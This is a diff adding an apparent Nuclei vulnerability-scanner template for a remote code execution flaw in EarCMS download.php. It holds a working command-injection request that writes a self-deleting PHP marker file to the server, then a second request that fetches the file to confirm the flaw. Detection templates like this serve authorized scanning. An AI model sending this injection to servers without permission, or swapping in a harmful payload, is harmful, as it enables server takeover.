@@ -1,0 +1,38 @@
+id: earcms-download-php-exec
+info:
+  name: EarCMS download.php Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    EarCMS download.php has a code execution vulnerability that allows arbitrary command execution on the server, potentially granting server administrative access.
+  tags: rce
+http:
+  - raw:
+      - |
+        GET /source/pack/127.0.0.1/download.php?site=1%3Becho%20'%3C?php%20echo%20md5(233);unlink(__FILE__);?%3E'%20%3E%20{{randstr}}.php HTTP/1.1
+        Host: {{Hostname}}
+    stop-at-first-match: true
+    extractors:
+      - type: regex
+        name: shell_filename
+        internal: true
+        group: 0
+        regex:
+          - "{{randstr}}\\.php"
+    matchers:
+      - type: word
+        words:
+          - "exec() has been disabled for security reasons"
+        negative: true
+  - raw:
+      - |
+        GET /source/pack/127.0.0.1/{{shell_filename}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words:
+          - "e165421110ba03099a1c0393373c5b43"
+        part: body
